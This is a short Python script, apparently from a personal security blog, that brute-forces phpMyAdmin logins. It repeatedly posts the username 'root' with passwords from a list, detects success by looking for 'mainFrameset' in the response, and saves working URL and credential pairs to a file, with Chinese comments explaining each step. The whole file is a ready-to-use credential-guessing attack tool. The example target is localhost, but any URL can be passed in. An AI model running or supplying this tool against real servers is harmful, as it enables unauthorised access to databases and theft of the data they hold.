# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import requests
def scan(url,passwords):
    '''
    接受传入网址和密码列表
    :param url: http://127.0.0.1/phpmyadmin/
    :param password: [root,12346,root1234]
    :return:
    '''
    for password in passwords:
        data = {'pma_username': 'root', 'pma_password': password}
        # 组成发送的数据包
        try:
            r = requests.post(url,data=data)
            print(f'当前爆破用户名 root:{password}')
            # 发起请求，尝试登陆
            if b'mainFrameset' in r.content:
                # 登陆成功后 ，页面会有 mainFrameset这个关键词
                print('爆破成功')
                with open('success.txt','a+')as a:
                    a.write(url+'|root|'+password+'\n')
                return
            # 成功的会保存到目录的success.txt文本中
            # 然后return的功能是退出函数
        except:
            pass


if __name__ == '__main__':
    passwords = ['mysql','123456','root1234','root']
    scan('http://127.0.0.1/phpmyadmin/',passwords)